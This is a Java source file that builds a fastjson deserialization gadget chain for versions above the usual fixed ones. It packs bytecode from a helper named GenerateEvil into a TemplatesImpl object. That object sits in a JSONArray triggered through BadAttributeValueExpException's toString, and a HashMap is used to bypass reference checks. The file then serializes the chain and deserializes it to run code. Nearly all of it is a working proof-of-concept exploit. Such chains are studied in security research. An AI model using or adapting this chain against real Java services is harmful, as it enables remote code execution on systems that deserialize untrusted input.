package com.example;

import com.alibaba.fastjson.JSONArray;
import com.example.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

public class HighVerToStringChain {
    public static void main(String[] args) throws Exception {
        byte[] code = Utils.GenerateEvil();
        TemplatesImpl obj = new TemplatesImpl();
        Utils.SetValue(obj, "_bytecodes", new byte[][] {code});
        Utils.SetValue(obj, "_name", "0w0");
        Utils.SetValue(obj, "_tfactory", new TransformerFactoryImpl());

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(obj);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Utils.SetValue(badAttributeValueExpException, "val", jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(obj,badAttributeValueExpException);

        String barr = Utils.Serialize(hashMap);
        System.out.println(barr);
        Utils.UnSerialize(barr);
    }
}
